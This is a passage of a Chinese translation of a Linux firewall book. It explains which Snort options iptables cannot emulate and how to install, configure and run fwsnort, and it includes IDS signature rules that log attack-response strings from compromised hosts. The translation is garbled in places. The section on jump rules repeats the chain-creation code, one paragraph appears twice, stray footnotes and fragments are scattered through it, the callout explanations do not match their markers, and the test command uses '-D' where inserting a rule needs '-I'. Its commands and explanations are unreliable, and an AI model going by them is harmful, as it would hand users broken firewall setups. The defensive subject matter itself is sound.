01:10:24.481843 IP 192.168.10.1.80 > 192.168.10.2.32655: P 1:2(1) ack 1 win 5792 <nop,
nop,timestamp 10356969 47589527>
01:10:24.488910 IP 192.168.10.2.32655 > 192.168.10.1.80: P 1:13(12) ack 1 win 5840 <
nop,nop,timestamp 47589527 10356968>
❶01:10:24.488941 IP 192.168.10.1.80 > 192.168.10.2.32655: R 2434738188:2434738188(0)
win 0
01:10:24.490785 IP 192.168.10.2.32655 > 192.168.10.1.80: . ack 2 win 5840 <nop,nop,
timestamp 47589528 10356969>
01:10:24.490820 IP 192.168.10.1.80 > 192.168.10.2.32655: P 2:3(1) ack 1 win 5792
<nop,nop,timestamp 10356971 475827>
01:10:24.496571 IP 192.168.10.2.32655 > 192.168.10.1.80: . ack 3 win 5840 <nop,nop,
timestamp 47589530 56971>
01:10:24.683462 IP 192.168.10.2.32655 > 192.168.10.1.80: P 1:13(12) ack 3 win 5840 <
nop,nop,timestamp 47589578 56971>
❷01:10:24.683506 IP 192.168.10.1.80 > 192.168.10.2.32655: R 2434738190:2434738190(0)
win 0
```

## 不支持的 Snort 选项

到目前为止，我们已经证明 `iptables` 非常适合在内核中完全模拟相当比例的 Snort 规则。然而，Snort 中有许多选项没有良好的 `iptables` 替代方案，我们将通过讨论这些选项来结束本章。

### 注意事项

下文讨论的某些选项，如 `ack`、`fragbits` 以及某些 `byte_test` 和 `byte_jump` 功能，可以使用 `iptables` 的 u32 扩展（本章稍后提到）进行模拟。此外，之前讨论过的选项，如 `id`、`seq`、`icmp_id` 和 `icmp_seq` 也可以用 u32 扩展进行模拟；一旦 u32 扩展移植到 2.6 内核，它将在 fwsnort 中获得支持。不支持的选项包括以下：

### `asn1`
`asn1` 关键字允许 Snort 将签名链接到解码后的抽象语法一 (ASN.1) 数据（通常用于 SMB 协议）。在 `iptables` 中没有良好的方法来模拟与此 Snort 关键字相关的复杂处理。

### `byte_jump`
`byte_jump` 选项允许数据包本身来决定 Snort 在应用下一个模式匹配或 `byte_test` 之前将跳过多少字节的数据。这意味着偏移量不需要预先知道，因此协议本身可以决定执行后续测试的位置。这对于使用长度变化的字段的协议（如 DNS）特别有用。与上面的 `byte_test` 关键字一样，使用 u32 匹配是使用 `iptables` 模拟 `byte_jump` 测试的最佳方法，但我们必须等待 2.6 内核提供 u32 匹配功能。

### `byte_test`
此选项使 Snort 能够对数据包数据中的特定偏移量应用数值测试。虽然可以使用 `pcre` 选项来模拟 `byte_test` 提供的某些功能（例如，正则表达式 `".{20}5\d{3}"` 将匹配从第 21 个字节开始大于 4999 的四位数），但通常应避免这样做，因为 `byte_test` 的性能通常优于 `pcre`。u32 匹配也可以在某种程度上模拟此操作，但它尚未用于 2.6 内核。

### `flowbits`
此选项被 Snort 用于在规则之间传递状态信息。例如，一个初始 Snort 规则可以检测明文协议的登录阶段是否完成，如果是，通过 `flowbits` 选项设置 `LoggedIn` 标签。然后，另一个不同的 Snort 规则也可以使用 `flowbits` 选项在执行额外的数据测试之前测试 `LoggedIn` 标签是否设置。这种操作可以通过结合 `iptables` 中的 `CONNMARK` 目标和字符串匹配扩展来有限模拟，但 fwsnort 尚未支持此。L7-filter 数据包分类项目也可以在某种程度上模拟此（参见 [`l7-filter.sourceforge.net`](http://l7-filter.sourceforge.net)）。

### `fragbits`
此选项允许 Snort 对 IP 头中的碎片位进行测试。虽然 `iptables` 可以应用匹配标准来确定数据包是否被碎片（通过 `-f` 参数），但这种能力远不如 Snort 的实现。此外，如果 Linux 内核启用了连接跟踪，数据包在被 `iptables` 看到之前会自动重组。这是连接跟踪工作的必要条件，因为只有完整的数据包才能被分类为属于或不属于某个连接。这是一种优势，因为受此类内核保护的网络会自动阻止大多数基于碎片数据包的 IDS 规避尝试。

### `isdataat`
此选项指示 Snort 仅测试特定偏移量处是否存在数据。偏移量可以用绝对形式指定（例如 `30`），也可以从之前的模式匹配中得出（例如 `30,relative`）。

### `pcre`
这代表 *Perl 兼容正则表达式*，并允许 Snort 对数据包数据应用复杂的正则表达式（可能包含反向引用和其他密集型操作）。从稳定性角度来看，将此功能直接放入 Linux 内核是有风险的；在用户态应用程序中执行此类操作更为合理。

### `rpc`




这使得 `Snort` 能够解析远程过程调用（RPC）流量中包含的应用程序、过程和程序版本。`iptables` 的 `rpc` 扩展允许在 `iptables`策略中匹配过程调用次数，但该模块仅适用于 2.6 之前的内核，且 `fwsnort` 尚未支持它。

`ulog` 项目是一个构建在 `netlink` 套接之的基础设施，它允许将整个数据包从内核发送到用户态守护进程 `ulog`，在其中数据包可以以 PCAP 等多种格式记录，甚至记录到 MySQL 数据库。更多信息请参阅 [`www.netfilter.org/projects/ulogd/index.html`](http://www.netfilter.org/projects/ulogd/index.html)。

`iptables` 的 `u32` 扩展允许 `iptables` 匹配 IP 数据包中的任意字节，并对其进行数值测试（因此，即使没有 IP ID 匹配，你也可以用 `u32` 扩展来模拟一个），但它尚未正式集成到 2.6 内核中。

请查看 [`l7-filter.sourceforge.net`](http://l7-filter.sourceforge.net)  L7-filter 数据包分类器项目。

从技术上讲，字符串匹配 `iptables` `--from` 和 `--to` 参数应用于以太网数据链路层 MAC 字段的开头。

这里有一些细节。例如，`TCP ACK` 数据包的平均头部长度远小于 `TCP SYN` 数据包的头部长度，因为最大段大小（MSS）等连接初始化参数在已建立的 TCP 连接中不会重新发布。`TCP ACKs` 有时仅包含时间戳选项和可能的几个 NOP。

`Snort` 社区通常指代特定的流预处理器版本，例如 `stream4` 或 `stream5`，但此处通常没有必要区分这些区别。

TCP 连接劫持有时也可以用于破坏系统，但这类攻击非常冷门，且通常会被应用层加密的使用所阻止。

# 结语

在讨论的目前，我们已经很好地了解 `iptables` 能多紧密地模拟 `Snort` IDS 中的许多数据包匹配选项，但我们还没有看到由 `fwsnort` 构建的完整规则集运行。这正是我们将在下一章涵盖的内容。附录 B 也包含一个由 `fwsnort` 构建的完整 `iptables` 规则集。

# 第 10 章 部署 FWSNORT

在完成了第 9 章](#ch09.html "Chapter 9. 将 SNORT 规则转换为 IPTABLES 规则") 中关于在 `iptables` 内模拟 `Snort` 规则选项的理论讨论后，本章将讨论如何让 `fwsnort` 真正发挥作用！即，我们将讨论 `fwsnort` 的管理，并说明如何使用它指示 `iptables` 去检测与 `Snort` 签名规则集相关的攻击。

## 安装 fwsnort

与 `psad` 一样，`fwsnort` 自带了安装程序 `install.pl`。该程序处理安装的所有方面，包括保留来自之前 `fwsnort` 安装的配置、安装两个 Perl 模块（`Net::IPv4Addr` 和 `IPTables::Parse`）以及（可选的）从 [`www.bleedingsnort.com`](http://www.bleedingsnort.com) 下载最新的 Bleeding Snort 签名集。如果你运行基于 RPM 的 Linux 发行版，也可以从 RPM 安装 `fwsnort`。

### 注意

截至 2005 年 3 月，`Snort` 签名规则集仅作为付费服务提供。在此日期之前，Snort 规则可以在 Snort 网站（[`www.snort.org`](http://www.snort.org））免费获取。许多安全应用（包括 `fwsnort`）通过提供自动更新功能来同步最新的 `Snort` 规则利用这些免费规则。虽然这种自动更新已不再可行，但截至本文，Bleeding Snort 项目发布的最新 `Snort` 规则集仍可以（免费）下载。

`fwsnort` 安装程序将 `Net::IPvAddr` 和 `IPTables::Parse` Perl 模块放置在 `/usr/lib/fwsnort` 目录下，以免污染系统 Perl 库树。（这与 `psad` 实现的安装策略相似，详见第 5 章](#ch05.html "Chapter 5. INTRODUCING PSAD: THE PORT SCAN ATTACK DETECTOR"。）

为了使用 `fwsnort`，你需要能够使用 `iptables` 的字符串匹配功能。如果你运行内核版本为 2.6.14 或更高，字符串匹配可能已经编译到你的内核中了。

检查运行的内核是否支持字符串匹配扩展的一种简单方法是尝试针对不存在的 IP 地址创建字符串匹配的 `iptables` 规则（以免干扰任何真实的网络通信），如下：

```
[iptablesfw]# iptables -D INPUT 1 -i lo -d 127.0.0.2 -m string --string "testing " --algo bm -j ACCEPT
```

如果返回错误 `iptables: no chain/target/match by that name`，则运行的内核中没有该扩展。可以通过在内核配置文件中启用 `CONFIG_NETFILTER_XT_MATCH_STRING` 选项、重新编译，然后进入新内核来修复（参见第 14 页的“内核配置”推荐 iptables 内核编译选项）。如果上述命令成功，则说明 `iptables` 字符串匹配与你的内核兼容，你应该删除新规则：

```
[iptablesfw]# iptables -D INPUT 1
```

要安装 `fwsnort-1.0`，请执行以下命令。（此安装程序的输出经过简化，但显示了划分原始 `Snort` 规则集的各种文件，如 `backdoor.rules` 和 `web-cgi.rules`。）




```bash
 [iptablesfw]$ cd /usr/local/src
[iptablesfw]$ wget http://www.cipherdyne.org/fwsnort/download/fwsnort-1.0.tar.bz2
[iptablesfw]$ wget http://www.cipherdyne.org/fwsnort/download/fwsnort-1.0.tar.bz2.md5
[iptablesfw]$ wget http://www.cipherdyne.org/fwsnort/download/fwsnort-1.0.tar.bz2.asc
[iptablesfw]$ md5sum -c fwsnort-1.0.tar.bz2.md5
gpg --verify fwsnort-1.0.tar.bz2.asc
gpg: Signature made Sat 21 Apr 2007 09:29:02 AM EDT using DSA key ID A742839F
gpg: Good signature from "Michael Rash <mbr@cipherdyne.org>"
gpg:                 aka "Michael Rash <mbr@cipherdyne.com>"
fwsnort-1.0.tar.bz2: OK
[iptablesfw]$ tar xfj fwsnort-1.0.tar.bz2
[iptablesfw]$ su -
Password:
[iptablesfw]# cd /usr/local/src/fwsnort-1.0
[iptablesfw]# ./install.pl
[+] mkdir /etc/fwsnort
[+] mkdir /etc/fwsnort/snort_rules
[+] Installing the Net::IPv4Addr Perl module
[+] Installing the IPTables::Parse Perl module
[+] Would you like to download the latest Snort rules from
    http://www.bleedingsnort.com?
    ([y]/n)? y
--22:01:11--  http://www.bleedingsnort.com/bleeding-all.rules
           => 'bleeding-all.rules'
Resolving www.bleedingsnort.com... 69.44.153.29
Connecting to www.bleedingsnort.com[69.44.153.29]:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 292,192 [text/plain]
100%[======================================>] 292,192      109.94K/s
22:01:17 (109.77 KB/s) - 'bleeding-all.rules' saved [292,192/292,192]
[+] Copying all rules files to /etc/fwsnort/snort_rules
[+] Installing snmp.rules
[+] Installing finger.rules
[+] Installing info.rules
[+] Installing ddos.rules
[+] Installing virus.rules
[+] Installing icmp.rules
[+] Installing dns.rules
[+] Installing rpc.rules
[+] Installing backdoor.rules
[+] Installing scan.rules
[+] Installing shellcode.rules
[+] Installing web-client.rules
[+] Installing web-cgi.rules
[+] Installing exploit.rules
[+] Installing attack-responses.rules
[+] Installing web-attacks.rules
[+] Installing fwsnort.8 man page as /usr/share/man/man8/fwsnort.8
[+] Compressing manpage /usr/share/man/man8/fwsnort.8
[+] Copying fwsnort.conf -> /etc/fwsnort/fwsnort.conf
[+] Copying fwsnort -> /usr/sbin/fwsnort
[+] fwsnort will generate an iptables script located at:
    /etc/fwsnort/fwsnort.sh when executed.
[+] fwsnort has been successfully installed!
```

## 运行 fwsnort

在内核提供字符串匹配的系统上安装 fwsnort 后，我们现在可以让 fwsnort 为我们工作了。无需多说，我们直接从命令行启动 fwsnort。通常情况下，fwsnort 以 root 身份运行，因为默认情况下它会查询 `iptables` 以确定运行的内核中可用哪些扩展，然后根据此调整转换过程（下面的部分输出为简略形式）：

```
 [iptablesfw]# fwsnort
    Snort Rules File          Success   Fail      Ipt_apply Total
[+] attack-responses.rules    15        2         0         17
[+] backdoor.rules            62        7         1         69
[+] bad-traffic.rules         10        3         0         13
[+] bleeding-all.rules        1076      573       5         1649
[+] exploit.rules             31        43        0         74
[+] web-cgi.rules             286       62        0         348
[+] web-client.rules          7        10        0         17
[+] web-coldfusion.rules      35        0         0         35
[+] web-frontpage.rules       34        1         0         35
[+] web-iis.rules             103       11        0         114
[+] web-misc.rules            265       61        0         326
[+] web-php.rules             78        48        0         126
[+] x11.rules                 2        0         0         2

                              2725      1761      91        4486
[+] Generated iptables rules for 2725 out of 4486 signatures: 60.74%
[+] Found 91 applicable snort rules to your current iptables policy.
[+] Logfile:         /var/log/fwsnort.log
[+] Iptables script: /etc/fwsnort/fwsnort.sh
```

关于 fwsnort 输出，要注意的一点之一是，对于每个 Snort 规则文件，都会打印出成功和失败转换的规则计数（`Success` 和 `Fail`）、适用于运行中的 `iptables` 策略的规则数（`Ipt_apply`）以及规则文件中 Snort 规则的总数（`Total`）。

在上述输出的最后，fwsnort 打印了可以转换的 Snort 规则总数（4486 中的 2725 个）。60.74% 的比例在任何内核编译了 `string`、`length`、`tos` 和 `ipv4` 匹配的 Linux 系统上都可以实现。最后，fwsnort 显示了两个文件路径：`/var/log/fwsnort.log` 和 `/etc/fwsnort/fwsnort.sh`。

`fwsnort.log` 文件包含了有关转换过程的信息，并用于确定特定规则转换失败的原因。例如，`bleeding-all.rules` 文件中标识为 `SID 200336` 的 Snort 规则包含 `pcre` ，因此与 `iptables` 不兼容。该不兼容记录在 `fwsnort.log` 中的一个日志中：

```
 [-] SID: 200336  Unsupported option: "pcre" at line: 120. Skipping rule.
```

### 注意事项

`fwsnort.sh` 脚本是 fwsnort 真正的“核心”；它是由 fwsnort 生成的 Bourne shell 脚本，负责实现必要的 `iptables` 命令以构建等效的 `iptables` 策略。该脚本的内部机制在第 179 页的“fwsnort.sh 结构”中进行了讨论，可以在 附录 B 中找到完整的 `fwsnort.sh` 脚本。你可以使用 `--no-ipt-sync` 命令行选项。

fwsnort 的主配置文件 `/etc/fwsnort/fwsnort.conf` 定义了网络、端口号、系统二进制路径（例如 iptables 的路径）以及正确运行所需的其他信息。

与 psad 一样，`fwsnort.conf` 文件遵循简单的键值对格式，许多关键字和语义与 Snort 自身配置文件中的内容完全相同。例如，`HOME_NET` 和 `EXTERNAL_NET` 关键字默认为通配值 `any`，并且 IP 地址和/网络列表可以包含在大括号内。系统也支持变量解析；例如，`HTTP_SERVERS` 映射到 `$HOME_NET`，后者又映射到特定的网络（或多个网络）或通配值 `any`。





你可以在下方找到一个完整的 `fwsnort.conf` 文件示例（位于 [`www.cipherdyne.org/linuxfirewalls`](http://www.cipherdyne.org/linuxfirewalls)），并且书中所有的 `fwsnort` 使用示例都将引用此配置文件。在这种情况下，受部署 `fwsnort` 的 `iptables` 防火墙保护的网络是 C 类网络 `192.168.10.0/24`（参见图 1-2），因此我们相应地设置了 `HOME_NET`。

```
 [iptablesfw]# cat /etc/fwsnort/fwsnort.conf
#  这是 fwsnort 的配置文件。该文件与
#  Snort 的配置文件有一些相似之处。
# $Id: fwsnort.conf 356 2007-03-20 01:31:28Z mbr $

### fwsnort 将所有流向本地
### 机器或源自本地机器的流量在 Snort 规则术中视为流向/源自 HOME_NET。
### 如果本地系统只有一个接口，则不会有
### 通过 FWSNORT_FORWARD 链处理的规则，因为没有流量
### 会进入 iptables FORWARD 链。
HOME_NET                192.168.10.0/24;
EXTERNAL_NET            any;
### 服务器列表。fwsnort 支持与 Snort 相同的变量解析。
HTTP_SERVERS            $HOME_NET;
SMTP_SERVERS            $HOME_NET;
DNS_SERVERS             $HOME_NET;
SQL_SERVERS             $HOME_NET;
TELNET_SERVERS          $HOME_NET;
### AOL AIM 服务器网段
AIM_SERVERS         [64.12.24.0/24, 64.12.25.0/24, 64.12.26.14/24, 64.12.28.0/24, 64.1
22.29.0/24, 64.12.161.0/24, 64.12.163.0/24, 205.188.5.0/24, 205.188.9.0/24];
### 可配置端口号
SSH_PORTS          22;
HTTP_PORTS          80;
SHELLCODE_PORTS     !80;
ORACLE_PORTS        1521;
### 定义平均包长度和最大帧长度。这用于
### 使用 iptables 长度匹配来模拟 Snort 的 dsize 选项。
❶ AVG_IP_HEADER_LEN       20;   ### IP 选项通常不使用。
AVG_TCP_HEADER_LEN      40;   ### 包括选项
MAX_FRAME_LEN           1500;
### 使用 WHITELIST 变量定义一个主机/网络列表，
### 这些列表应被 fwsnort 完全忽略。例如，如果你想
### 将 IP 地址 192.168.10.1 和网络 10.1.1.0/24 放入白名单，
### 你将使用（注意你也可以指定多个 WHITELIST
### 变量，每行一个）：
#WHITELIST             192.168.10.1, 10.1.1.0/24;
❷ WHITELIST               NONE;
### 使用 BLACKLIST 变量定义一个主机/网络列表，
### 对于这些列表，fwsnort 应该 DROP 或 REJECT 所有流量。
### 例如，要 DROP 来自 192.168.10.0/24 网络的所有流量，
### 你可以使用：
###     BLACKLIST            192.168.10.0/24    DROP;
### 要让 fwsnort REJECT 来自 192.168.10.0/24 的所有流量，
### 你将使用：
###     BLACKLIST            192.168.10.0/24    REJECT;
BLACKLIST               NONE;
### 定义内置链中的跳转位置，以跳转到
### fwsnort 链。
❸ FWSNORT_INPUT_JUMP      1;
FWSNORT_OUTPUT_JUMP     1;
FWSNORT_FORWARD_JUMP    1;
### iptables 链（这些通常不需要更改）
FWSNORT_INPUT           FWSNORT_INPUT;
FWSNORT_INPUT_ESTAB     FWSNORT_INPUT_ESTAB;
FWSNORT_OUTPUT          FWSNORT_OUTPUT;
FWSNORT_OUTPUT_ESTAB    FWSNORT_OUTPUT_ESTAB;
FWSNORT_FORWARD         FWSNORT_FORWARD;
FWSNORT_FORWARD_ESTAB   FWSNORT_FORWARD_ESTAB;
### 系统二进制文件
shCmd           /bin/sh;
echoCmd         /bin/echo;
tarCmd          /bin/tar;
wgetCmd         /usr/bin/wget;
unameCmd        /usr/bin/uname;
ifconfigCmd     /sbin/ifconfig;
iptablesCmd     /sbin/iptables;
```

在 ❶ 处，`fwsnort.conf` 为 `iptables` 设置了平均长度。

在 ❷ 处，`fwsnort.sh` 允许为最终系统轻松调整路径：

```bash
ECHO=/bin/echo
IPTABLES=/sbin/iptables
```

`fwsnort.sh` 的第二部分定义了 `iptables` 和 `echo` 系统二进制文件的路径。这些路径继承自 `fwsnort.conf` 文件中的 `iptablesCmd` 和 `echoCmd` 关键字，并且 `fwsnort` 会进行检查以确保这些路径合理。然而，`fwsnort.sh` 并不一定要在安装 `fwsnort` 的系统上执行。

在 ❸ 处，`fwsnort.conf` 定义了 `iptables` 内部跳转位置。

## fwsnort.sh 的结构

脚本脚本 `fwsnort.sh` 分为五个部分。第一部分是头部，包含了关于 `fwsnort` 的注释：

```bash
#!/bin/sh

## File: /etc/fwsnort/fwsnort.sh

### Purpose: 此脚本由 fwsnort 自动生成

### Generated with: fwsnort
### Generated on host: iptables
### Generated at: Sun Jul 15 23:12:43 2007

# Author: Michael Rash <mbr@cipherdyne.org>

### Version: 1.0 (file revision: 381)
```

`fwsnort.sh` 的第三部分负责为 `fwsnort` 规则构建专用的 `iptables` 链。所有的 Snort 规则（下讨论的跳转规则外）都添加到这些自定义链中，以与任何现有的 `iptables` 策略保持严格分离。

赋予 `fwsnort` 链的名称大致描述了在每个链中执行的流量检查类型。例如，`FWSNORT_INPUT` 链用于检查指向本地系统的流量，因此受 `iptables` 的 `INPUT` 链控制。同样，`FWSNORT_OUTPUT` 链仅适用于源自防火墙系统的数据包（通过 `OUTPUT` 链），而 `FWSNORT_FORWARD` 链则管理目标是通过本地系统的数据包（通过 `FORWARD` 链）。

### TCP 连接状态与 fwsnort 链

由于通过 Snort 的 `flow: established` 选项将规则应用于已建立的 TCP 会话具有相对重要，`fwsnort` 为此类规则创建了特殊链。这些链的名称只需在上述每个 `fwsnort` 链后附加字符串 `_ESTAB`。一旦创建了所有 `fwsnort` 链，就会添加跳转规则，使用 `iptables` 状态匹配将属于建立会话的 TCP 包发送到相应的 `_ESTAB` 链。例如，所示，`FWSNORT_INPUT` 链中的数据包将跳转到 `FWSNORT_INPUT_ESTAB` 链：





```
 ############ Create fwsnort iptables chains. ############
$IPTABLES -N FWSNORT_INPUT 2> /dev/null
$IPTABLES -F FWSNORT_INPUT
$IPTABLES -N FWSNORT_INPUT_ESTAB 2> /dev/null
$IPTABLES -F FWSNORT_INPUT_ESTAB
$IPTABLES -N FWSNORT_OUTPUT 2> /dev/null
$IPTABLES -F FWSNORT_OUTPUT
$IPTABLES -N FWSNORT_OUTPUT_ESTAB 2> /dev/null
$IPTABLES -F FWSNORT_OUTPUT_ESTAB
$IPTABLES -N FWSNORT_FORWARD 2> /dev/null
$IPTABLES -F FWSNORT_FORWARD
$IPTABLES -N FWSNORT_FORWARD_ESTAB 2> /dev/null
$IPTABLES -F FWSNORT_FORWARD_ESTAB
############ Inspect ESTABLISHED tcp connections. ############
$IPTABLES -A FWSNORT_INPUT -p tcp -m state --state ESTABLISHED -j FWSNORT_INPUT_ESTAB
$IPTABLES -A FWSNORT_OUTPUT -p tcp -m state --state ESTABLISHED -j FWSNORT_
OUTPUT_ESTAB
$IPTABLES -A FWSNORT_FORWARD -p tcp -m state --state ESTABLISHED -j FWSNORT_FORWARD_
ESTAB
```

### 签名检查与日志生成

`fwsnort.sh` 的第四部分是执行重量级数据包检测的地方。该部分中的所有规则都会被添加到上述的任一 `fwsnort` 链中。每条规则包含来自 Snort 规则头部和规则选项，例如源和目的 IP 地址、端口号，以及内容字符串、`length`、`ttl` 或 `tos` 匹配项等。

默认情况下，`fwsnort` 翻译的每条 Snort 规则都会生成一个 `iptables` 命令，该命令使用 `LOG` 目标并配合日志前缀，用于向用户通信签具体信息。由 `fwsnort` 构建的日志前缀包含了 `fwsnort` 链中的规则编号和 Snort 签名 ID 值，并指示该签名是否是从已建立的 TCP 连接记录的。

例如，`FWSNORT_FORWARD_ESTAB` 链中的第一条规则包含一个卷序列号签名（Snort ID 1292）构建的日志前缀，类似于：`[1] SID1292 ESTAB`。

默认情况下，每个 `iptables` `LOG` 规则都使用注释匹配来标记 Snort 的 `sid`、`msg`、`classtype`、`rev` 和 `reference` 字段以及 `fwsnort` 版本号。例如，对于 Snort 规则 ID 1292，关联注释为：

```
 sid:1292; msg:ATTACK-RESPONSES directory listing; classtype: bad-unknown; rev: 9; FWS:
1.0
```

以下是 `fwsnort.sh` 脚本的签名部分。（注意：`iptables` 规则按照对应的 Snort 规则文件组织的。）

```
 ############ attack-responses.rules ############

$ECHO "[+] Adding attack-responses rules."
### alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"ATTACK-RESPONSES directory
listing"; flow:established; content:"Volume Serial Number"; classtype:bad-unknown;
sid: 1292; rev:9;)
$IPTABLES -A FWSNORT_FORWARD_ESTAB -s 192.168.10.0/24 -p tcp -m string --string
"Volume Serial Number" --algo bm -m comment --comment "sid:1292; msg: ATTACK-RESPONSES
directory listing; classtype: bad-unknown; rev: 9; FWS:1.0;" -j LOG --log-ip-options
--log-tcp-options --log-prefix "[1] SID1292 ESTAB "
$IPTABLES -A FWSNORT_OUTPUT_ESTAB -p tcp -m string --string "Volume Serial Number"
--algo bm -m comment --comment "sid:1291; msg: ATTACK-RESPONSES directory listing;
classtype: bad-unknown; rev: 9; FWS:1.0;" -j LOG
--log-ip-options --log-tcp-options --log-prefix "[1] SID1292 ESTAB "
### alert tcp $HTTP_SERVERS $HTTP_PORTS -> $EXTERNAL_NET any (msg:"ATTACK-RESPONSES
command completed"; flow:established; content:"Command completed"; nocase; reference:
bugtraq,1806; classtype:bad-unknown; sid:494; rev:10;)
$IPTABLES -A FWSNORT_FORWARD_ESTAB -s 192.168.10.0/24 -p tcp --sport 80 -m string
--string "Command completed" --algo bm -m comment --comment "sid:494; msg: ATTACK-
RESPONSES
command completed; classtype: bad-unknown; reference: bugtraq,1806; rev: 10; FWS:1.0;"
-j LOG --log-ip-options --log-tcp-options
--log-prefix "[2] SID494 ESTAB "
$IPTABLES -A FWSNORT_OUTPUT_ESTAB -p tcp --sport 80 -m string --string "Command
completed" --algo bm -m comment --comment "sid:494; msg: ATTACK-RESPONSES command
completed;
classtype: bad-unknown; reference: bugtraq,1806; rev: 10; FWS:1.0;" -j LOG --log-ip-
options --log-tcp-options --log-prefix "[2] SID494 ESTAB "
```

### 使用跳转规则（Jump Rules）激活 fwsnort 链

`fwsnort.sh` 的最后部分通过引导 `iptables` 将流量重定向到这些规则，使整个规则集在内核中激活。到此为止，`fwsnort.sh` 执行的所有 `iptables` 命令仅仅是将 `fwsnort` 策略加载到正在运行的内核中。

由于目前还没有任何跳转规则将数据包从内置的 `iptables` 链发送到 `fwsnort` 链，我们目前为止仅利用了内核内存；没有任何规则尚能与在内核中流过的数据包交互。当 `fwsnort` 规则被划分到自己的链中，情况就会发生变化；数据包在命中 `iptables` 策略中的 `QUEUE` 规则之前，可以跳转到这些链。

```
$IPTABLES -N FWSNORT_INPUT 2> /dev/null
$IPTABLES -F FWSNORT_INPUT
$IPTABLES -N FWSNORT_INPUT_ESTAB 2> /dev/null
$IPTABLES -F FWSNORT_INPUT_ESTAB
$IPTABLES -N FWSNORT_OUTPUT 2> /dev/null
$IPTABLES -F FWSNORT_OUTPUT
$IPTABLES -N FWSNORT_OUTPUT_ESTAB 2> /dev/null
$IPTABLES -F FWSNORT_OUTPUT_ESTAB
$IPTABLES -N FWSNORT_FORWARD 2> /dev/null
$IPTABLES -F FWSNORT_FORWARD
$IPTABLES -N FWSNORT_FORWARD_ESTAB 2> /dev/null
$IPTABLES -F FWSNORT_FORWARD_ESTAB
$IPTABLES -A FWSNORT_INPUT -p tcp -m state --state ESTABLISHED -j FWSNORT_INPUT_ESTAB
$IPTABLES -A FWSNORT_OUTPUT -p tcp -m state --state ESTABLISHED -j FWSNORT_
OUTPUT_ESTAB
$IPTABLES -A FWSNORT_FORWARD -p tcp -m state --state ESTABLISHED -j FWSNORT_FORWARD_
ESTAB
```

### 注意

参考 [<a href="#apb">附录 B</a>] 查看 fwsnort 脚本将规则转换为 iptables 策略。

## fwsnort 的命令行选项

`fwsnort.sh` 的最后部分通过引导 `iptables` 将流量通过这些规则，使整个规则集在内核中激活。到此为止，`fwsnort.sh` 执行的所有 `iptables` 命令仅仅是将 `fwsnort` 策略加载到正在运行的内核中。

`fwsnort` 有许多命令行选项可以用来影响其执行，我们在这里介绍其中一些常用的选项。

**`--ipt-drop`**

此选项指示 `fwsnort` 在记录数据包之外，将其丢弃到目标目标。（默认情况下，`fwsnort` 仅记录。）这赋予了 `fwsnort` 主动响应网络攻击的能力。

**`--ipt-reject`**

此选项指示 `fwsnort` 构建一个 iptables 策略，利用 `REJECT` 目标终止恶意 TCP 连接，并对恶意 UDP 流量使用 ICMP 不可消息进行响应。

**`--snort-conf`**

此选项指示 `fwsnort` 直接从现有的 Snort 配置文件中读取如 `HOME_NET`、`EXTERNAL_NET`、`HTTP_SERVERS` 等变量（通常位于 `/etc/snort/snort.conf`）。没有任何阻止 Snort 和 `fwsnort` 在同一系统上运行。即使在 Snort 以内模式下运行时也是如此，因为 `fwsnort` 规则被划分到自己的链中；数据包在命中 `iptables` 策略中的 `QUEUE` 规则之前，可以跳转到这些链。

**`--snort-sid`**

此选项允许将 `fwsnort` 的翻译工作限制在特定的 Snort ID 或一组 Snort ID 上。当某个软件出现新漏洞，且该软件受 iptables 防火墙保护，Snort 社区发布了检测利用该漏洞攻击的新签名时，这种方法非常有用。通过带有 `--snort-sid` 选项使用 `fwsnort`，我们可以快速部署新策略来记录和/或丢弃与攻击关联的数据包。

**`--include-type`**

此选项指示 `fwsnort` 仅翻译位于单个规则文件中 Snort 规则。例如，要翻译 `backdoor.rules` 文件中的规则，应在 `fwsnort` 命令行使用 `--include-type backdoor`。也支持逗号分隔的类型列表，例如 `--include-type ftp,mysql`。

**`--ipt-list`**





此选项显示各种 fwsnort 链中的所有活动规则。这些包括 `FWSNORT_INPUT`、`FWSNORT_INPUT_ESTAB`、`FWSNORT_OUTPUT`、`FWSNORT_OUTPUT_ESTAB`、`FWSNORT_FORWARD` 和 `FWSNORT_FORWARD_ESTAB`。

### `--ipt-flush`
此选项刷新 fwsnort 链中的所有活动规则。这对于快速移除 fwsnort 规则而不移除与现有策略相关的其他 iptables 规则非常有用。

### `--no-addresses`
此选项强制 fwsnort 不引用防火墙系统上任何接口的 IP 地址。如果 fwsnort 部署在没有给接口分配 IP 地址的桥接防火墙上，此选项最为有用。

### `--no-ipt-sync`
此选项指示 fwsnort 禁用通常针对本地 iptables 策略运行的所有兼容性检查。生成的 fwsnort 策略将不会跳过任何检测防火墙配置为不接受流量的规则。

### `--restrict-intf intf`
此选项将 fwsnort 规则限制到指定的接口（或接口）。默认情况下，fwsnort 不检查回环接口上的流量，但检查所有其他接口上的流量。要让 fwsnort 仅检查例如 `eth0` 和 `eth1` 接口上的流量，应使用 `--restrict-intf eth0,eth1`。

¹ 注意，任何具有 `CAP_NET_ADMIN` 能力的非 root 用户也可以执行 iptables 命令。

² 关于主机安全问题和加固策略的更多信息，Bastille Linux (`http://www.bastille-linux.org`) 提供了大量的教育信息，并具有自动加固各种 Linux 发行版的能力。

³ 这使得多次执行 `fwsnort.sh` 脚本并保持现有 iptables 策略的整洁成为可能，因为每个内置链只能存在一个 fwsnort 跳跃规则。1.0 之前的 fwsnort 版本有一个 bug，如果多次执行 `fwsnort.sh` 脚本，会添加额外的跳转规则。

# 观察 fwsnort 的运行

通过特定的示例攻击说明 fwsnort 操作是查看 fwsnort 如何工作以及如何有效利用它的实用方法。在本节中，我们将涵盖一组源自 Snort 规则集的攻击，并看看 fwsnort 如何检测并（可选地）响应这些攻击。默认情况下，由 fwsnort 构建的策略行为类似于入侵检测系统，因为攻击仅通过 `LOG` 目标记录日志；不会尝试丢弃包、重置 TCP 连接或生成 ICMP 错误代码包。然而，正如下面的示例所示，我们可以通过使用 fwsnort 的 `--ipt-reject` 或 `--ipt-drop` 命令行参数来快速将这种被动立场转变为主动。

## 检测 Trin00 DDoS 工具

